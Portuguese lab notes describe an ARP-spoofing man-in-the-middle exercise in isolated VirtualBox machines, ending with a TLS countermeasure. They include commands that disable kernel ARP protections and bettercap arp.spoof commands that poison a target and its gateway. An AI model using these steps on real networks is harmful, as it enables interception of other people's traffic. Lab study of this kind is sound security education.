

---
### 1. Ataque ARP

**ARP** significa Address Resolution Protocol. É um protocolo da camada de rede usado dentro de uma rede local. Em uma rede, cada dispositivo tem dois endereços principais:
    1.  **Endereço IP (Lógico)**: Identifica o dispositivo na rede global.
    2.  **Endereço MAC (Físico)**: Endereço único da placa de rede, gravado em hardware. O virtualBox geras macs lógicos para cada vm.
    
Para que dois dispositivos se comuniquem em uma rede local, eles precisam saber o endereço MAC um do outro. Para isso é enviado um request perguntando o mac:
1.  Nenhum dispositivo verifica se a resposta ARP que recebeu veio do dono legítimo do IP.
2.  A maioria dos sistemas operacionais atualiza sua tabela ARP com a última resposta que recebeu, sem questionar.

**Man-in-the-Middle (MitM)**: ataque  que explora a vulnerabilidade do ARP.
- O atacante quer se colocar entre a Vítima e o Gateway (o roteador).
- O atacante envia respostas ARP falsificadas para a rede, mentindo sobre o seu próprio endereço MAC.

---

**Deixando todos na mesma rede**
VBoxManage modifyvm "Roteador" --nic1 intnet --intnet1 intranet
VBoxManage modifyvm "Alvo" --nic1 intnet --intnet1 intranet
VBoxManage modifyvm "kali-linux-2026.2-virtualbox-amd64" --nic1 intnet --intnet1 intranet

**Configuração para cada vm**

**ROTEADOR**

Desativa proteções ARP do kernel
sudo sysctl -w net.ipv4.conf.all.arp_filter=0
sudo sysctl -w net.ipv4.conf.all.arp_announce=2
sudo sysctl -w net.ipv4.conf.all.arp_ignore=0
sudo sysctl -w net.ipv4.conf.enp0s3.arp_filter=0
sudo sysctl -w net.ipv4.conf.enp0s3.arp_announce=2
sudo sysctl -w net.ipv4.conf.enp0s3.arp_ignore=0

limpa endereçõs  ip que estão na interface
sudo ip addr flush dev enp0s3
Atribui o end ip
sudo ip addr add 192.168.100.1/24 dev enp0s3
ativa a interface
sudo ip link set enp0s3 up
ativa o repasse de pacotes ipv4
sudo sysctl -w net.ipv4.ip_forward=1

sudo iptables -P INPUT ACCEPT
sudo iptables -P FORWARD ACCEPT
sudo iptables -P OUTPUT ACCEPT
sudo iptables -Fcle
sudo iptables -t nat -F
ip addr show enp0s3
ping 192.168.100.1  # TESTAR SEU PRÓPRIO IP

**ALVO**
sudo ip addr flush dev enp0s3
sudo ip addr add 192.168.100.10/24 dev enp0s3
sudo ip link set enp0s3 up
sudo ip route add default via 192.168.100.1
ip addr show enp0s3
ping 192.168.100.1  # TESTAR ROTEADOR

**ATACANTE**
sudo systemctl stop NetworkManager
sudo ip addr flush dev eth0
sudo ip addr add 192.168.100.5/24 dev eth0
sudo ip link set eth0 up
sudo ip route add default via 192.168.100.1
ip addr show eth0
ping 192.168.100.1

---
- **Rede**: `192.168.100.0/24` 
- **Roteador**: `192.168.100.1`
- **Alvo**: `192.168.100.10` 
- **Atacante (Kali)**: `192.168.100.5` 
![](../../attachments/Pasted%20image%2020260831113820.png)

---

No alvo e no kali
ip route show default![](../../attachments/Pasted%20image%2020260831113937.png)![400](../../attachments/Pasted%20image%2020260831114030.png)
**teste 1**
no roteador
nc -l -p 12345
no alvo
echo "oi" | nc 192.168.100.1 12345

---

**NO KALI**
sudo sysctl -w net.ipv4.ip_forward=1

sudo wireshark
- filtro: port 12345
- Selecione a interface eth0 e Inicie a captura.

sudo bettercap -iface eth0                               Em outro terminal:
net.probe on                                                         Reconhecimento de rede
set arp.spoof.targets 192.168.100.10           Define o alvo
set arp.spoof.fullduplex true                           envenena tanto a vítima quanto o gateway
arp.spoof on                                                          Inicia o ataque ARP spoofing

No alvo
ping 192.168.100.1 -c 4                                      ping pro ip do roteador

**teste 2 sem defesa**
no roteador: Abre a porta 12345 e fica esperando alguém se conectar e enviar dados.
nc -l -p 12345
no alvo
echo "oi" | nc 192.168.100.1 12345

**Teste com defesa**
gerando certificado ssl criptografado
openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes -subj "/CN=192.168.100.1"
openssl s_server -accept 12345 -cert cert.pem -key key.pem
echo "oi" | openssl s_client -connect 192.168.100.1:12345 -quiet
